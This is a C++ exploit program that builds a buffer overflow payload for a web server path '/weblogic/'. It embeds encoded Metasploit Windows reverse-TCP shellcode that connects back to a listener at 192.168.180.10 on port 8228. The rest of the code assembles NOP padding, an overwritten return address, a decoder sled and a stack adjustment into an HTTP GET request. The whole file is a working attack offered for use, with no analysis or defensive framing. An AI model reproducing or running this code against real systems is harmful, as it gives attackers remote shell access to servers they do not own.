#include <iostream>
#include <cstdlib>
#include <cstring>
#include <fstream>
#include <string>

/*
 * windows/shell_reverse_tcp - 710 bytes
 * https://metasploit.com/
 * Encoder: x86/alpha_mixed
 * VERBOSE=false, LHOST=192.168.180.10, LPORT=8228, 
 * ReverseAllowProxy=false, ReverseListenerThreaded=false, 
 * StagerRetryCount=10, StagerRetryWait=5, 
 * PrependMigrate=false, EXITFUNC=process, CreateSession=true, 
 * AutoVerifySession=true
 */
size_t gShellSize = 710;
unsigned char gbuf[] = 
"\x89\xe0\xda\xdc\xd9\x70\xf4\x58\x50\x59\x49\x49\x49"
"\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43"
"\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41"
"\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
"\x58\x50\x38\x41\x42\x75\x4a\x49\x6b\x4c\x59\x78\x6b"
"\x32\x53\x30\x55\x50\x77\x70\x45\x30\x4b\x39\x68\x65"
"\x66\x51\x59\x50\x42\x44\x4e\x6b\x32\x70\x66\x50\x6c"
"\x4b\x50\x52\x76\x6c\x4c\x4b\x76\x32\x76\x74\x4e\x6b"
"\x74\x32\x51\x38\x54\x4f\x4c\x77\x31\x5a\x66\x46\x44"
"\x71\x49\x6f\x6e\x4c\x67\x4c\x35\x31\x31\x6c\x37\x72"
"\x34\x6c\x57\x50\x7a\x61\x4a\x6f\x36\x6d\x65\x51\x5a"
"\x67\x58\x62\x69\x62\x30\x52\x32\x77\x6c\x4b\x76\x32"
"\x54\x50\x6e\x6b\x71\x5a\x65\x6c\x6c\x4b\x52\x6c\x64"
"\x51\x62\x58\x69\x73\x31\x58\x57\x71\x38\x51\x30\x51"
"\x4e\x6b\x72\x79\x55\x70\x57\x71\x49\x43\x6e\x6b\x77"
"\x39\x36\x78\x58\x63\x54\x7a\x73\x79\x4c\x4b\x34\x74"
"\x4c\x4b\x37\x71\x6a\x76\x64\x71\x6b\x4f\x6e\x4c\x6b"
"\x71\x78\x4f\x66\x6d\x73\x31\x69\x57\x76\x58\x49\x70"
"\x74\x35\x48\x76\x63\x33\x31\x6d\x69\x68\x67\x4b\x31"
"\x6d\x57\x54\x71\x65\x4a\x44\x53\x68\x4e\x6b\x42\x78"
"\x57\x54\x56\x61\x58\x53\x35\x36\x6e\x6b\x34\x4c\x42"
"\x6b\x6c\x4b\x76\x38\x77\x6c\x53\x31\x58\x53\x4c\x4b"
"\x76\x64\x6e\x6b\x55\x51\x38\x50\x4f\x79\x62\x64\x31"
"\x34\x66\x44\x31\x4b\x33\x6b\x31\x71\x76\x39\x32\x7a"
"\x53\x61\x39\x6f\x4d\x30\x43\x6f\x53\x6f\x31\x4a\x6c"
"\x4b\x65\x42\x4a\x4b\x6c\x4d\x51\x4d\x43\x58\x56\x53"
"\x36\x52\x67\x70\x45\x50\x53\x58\x44\x37\x42\x53\x70"
"\x32\x71\x4f\x53\x64\x61\x78\x52\x6c\x30\x77\x47\x56"
"\x35\x57\x69\x6f\x49\x45\x4d\x68\x4c\x50\x43\x31\x63"
"\x30\x65\x50\x31\x39\x6a\x64\x46\x34\x32\x70\x53\x58"
"\x45\x79\x6f\x70\x32\x4b\x73\x30\x39\x6f\x58\x55\x72"
"\x70\x70\x50\x66\x30\x42\x70\x47\x30\x36\x30\x63\x70"
"\x46\x30\x71\x78\x68\x6a\x66\x6f\x4b\x6f\x79\x70\x69"
"\x6f\x69\x45\x5a\x37\x73\x5a\x64\x45\x31\x78\x59\x50"
"\x4f\x58\x6c\x74\x77\x7a\x62\x48\x67\x72\x43\x30\x31"
"\x30\x55\x74\x6f\x79\x78\x66\x31\x7a\x36\x70\x71\x46"
"\x46\x37\x42\x48\x6d\x49\x6d\x75\x53\x44\x53\x51\x39"
"\x6f\x5a\x75\x4c\x45\x6b\x70\x70\x74\x64\x4c\x39\x6f"
"\x52\x6e\x34\x48\x53\x45\x5a\x4c\x45\x38\x68\x70\x58"
"\x35\x4c\x62\x56\x36\x79\x6f\x79\x45\x51\x78\x72\x43"
"\x70\x6d\x65\x34\x53\x30\x4f\x79\x7a\x43\x71\x47\x62"
"\x77\x53\x67\x35\x61\x58\x76\x61\x7a\x65\x42\x76\x39"
"\x61\x46\x39\x72\x4b\x4d\x32\x46\x6b\x77\x31\x54\x77"
"\x54\x47\x4c\x55\x51\x57\x71\x4c\x4d\x50\x44\x56\x44"
"\x76\x70\x79\x56\x43\x30\x61\x54\x33\x64\x46\x30\x61"
"\x46\x30\x56\x53\x66\x37\x36\x31\x46\x62\x6e\x63\x66"
"\x42\x76\x42\x73\x72\x76\x51\x78\x30\x79\x4a\x6c\x35"
"\x6f\x4c\x46\x69\x6f\x6e\x35\x4b\x39\x39\x70\x72\x6e"
"\x43\x66\x62\x66\x59\x6f\x44\x70\x62\x48\x77\x78\x6c"
"\x47\x65\x4d\x35\x30\x49\x6f\x49\x45\x6f\x4b\x4a\x50"
"\x58\x35\x4c\x62\x70\x56\x62\x48\x4e\x46\x6a\x35\x4d"
"\x6d\x4f\x6d\x69\x6f\x5a\x75\x55\x6c\x34\x46\x51\x6c"
"\x56\x6a\x4f\x70\x59\x6b\x39\x70\x31\x65\x36\x65\x6f"
"\x4b\x53\x77\x52\x33\x31\x62\x30\x6f\x72\x4a\x35\x50"
"\x31\x43\x69\x6f\x5a\x75\x41\x41";

int main(int argc, char * argv[])
{
  if (argc != 3) {
    std::cerr << "Usage: ./exploit <address> <offset>"
    << "\n";
    exit(1);
  }
  else {
    
    // Break up the address into individual string
    // representations of the hex byte

    std::string s(argv[1]);

    std::string hex1 = std::string(1,s[0])+s[1];    
    std::string hex2 = std::string(1,s[2])+s[3];    
    std::string hex3 = std::string(1,s[4])+s[5];    
    std::string hex4 = std::string(1,s[6])+s[7];    

    size_t size = atoi(argv[2]);
    size_t address = 4;
    size_t decoderSled = 24;
    size_t reduceESP = 6;

    size_t totalSize = size + address + gShellSize + decoderSled + reduceESP;

    unsigned char buf[totalSize];
  
    unsigned char addr[4];
    addr[0] = std::stoi(hex4, 0, 16);
    addr[1] = std::stoi(hex3, 0, 16);
    addr[2] = std::stoi(hex2, 0, 16);
    addr[3] = std::stoi(hex1, 0, 16);

    size_t i = 0;
    while (i < size) {
      buf[i++] = '\x90';
    }

    buf[i++] = addr[0];
    buf[i++] = addr[1];
    buf[i++] = addr[2];
    buf[i++] = addr[3];

    // NOP sled for decoder
    for (size_t j = 0 ; j < decoderSled ; j++) {
      buf[i++] = '\x90';
    }

    // Byte code for sending `add esp, -200`
    buf[i++] = '\x81';
    buf[i++] = '\xC4';
    buf[i++] = '\x38';
    buf[i++] = '\xFF';
    buf[i++] = '\xFF';
    buf[i++] = '\xFF';

    for (size_t j = 0 ; j < gShellSize ; j++) {
      buf[i] = gbuf[j];
      i++;
    }

    // Print the output
    std::cout << "GET /weblogic/ ";
    for (i = 0 ; i < totalSize ; i++) {
      std::cout << buf[i];
    }
    std::cout << "\r\n\r\n";
  }

  return 1;
}